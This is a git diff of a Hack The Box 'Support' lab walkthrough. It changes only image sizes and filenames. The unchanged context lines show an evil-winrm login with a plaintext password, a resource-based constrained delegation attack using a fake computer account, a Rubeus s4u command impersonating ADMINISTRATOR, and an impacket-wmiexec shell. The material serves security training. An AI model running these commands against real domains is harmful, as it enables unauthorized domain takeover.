@@ -268,7 +268,7 @@ evil-winrm -i 10.129.227.255 -u support -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/3_1_nowinrm.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/3_0_no_winrm.png" width="90%"/>
 </p>
 
 So, let's keep enumerating the LDAP with the ldapsearch tool:
@@ -408,7 +408,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/5_0_user.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/5_0_user.png" width="70%"/>
 </p>
 
 And we got the user flag:
@@ -462,7 +462,7 @@ Here I drew the process, to see in a glance what it is happening:
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/6_0_kerb.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_0_kerb.jpg" width="90%"/>
 </p>
 
 
@@ -514,7 +514,7 @@ Get-NetComputer DC | Select-Object -Property name, msds-allowedtoactonbehalfofot
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/6_3_msds-dc.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_3_msds-dc.png" width="90%"/>
 </p>
 
 We got nothing, so last requierement checked. Now, let's perform the attack.
@@ -532,7 +532,7 @@ Evil-WinRM* PS C:\Users\support\Desktop>
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/6_4_machine.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_4_machine.png" width="90%"/>
 </p>
 
 Check if the computer was created and take the SID:
@@ -612,7 +612,7 @@ AuditFlags         : None
 We have SID _S-1-5-21-1677581083-3380853377-188903654-5601_ which is FAKE01$ SID. So we are good.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/6_7_checks.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_7_check.png" width="90%"/>
 </p>
 
 Now, perform the impersonation with Rubeus.exe First, generate the RC4 hash of the password we set for the FAKE01 computer:
@@ -654,11 +654,11 @@ Execute the following command to get the ticket as ADMINISTRATOR:
 
 ```
 .\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 
-  /impersonateuser:ADMINISTRATOR /msdsspn:cifs/DC.SUPPORT.HTB /ptt
+    /impersonateuser:ADMINISTRATOR /msdsspn:cifs/DC.SUPPORT.HTB /ptt
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/6_9_ticket.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_9_ticket.png" width="80%"/>
 </p>
 
 Even though we got the ticket, I did not impersonate the ADMINISTRATOR since I got permission denied trying to list C$ share in the DC:
@@ -695,7 +695,7 @@ Cached Tickets: (1)
 ```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/6_11_ticket.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_11_ticket.png" width="80%"/>
 </p>
 
 Tried many different configurations for Rubeus but didn't work at the end.
@@ -738,7 +738,7 @@ impacket-wmiexec SUPPORT.HTB/ADMINISTRATOR@DC.SUPPORT.HTB -no-pass -k
 </p>
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/7_1_root.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/7_1_root.png" width="60%"/>
 </p>
 
 ``` 1d00ed25fd6aad8a70fe85394fa4e506 ```
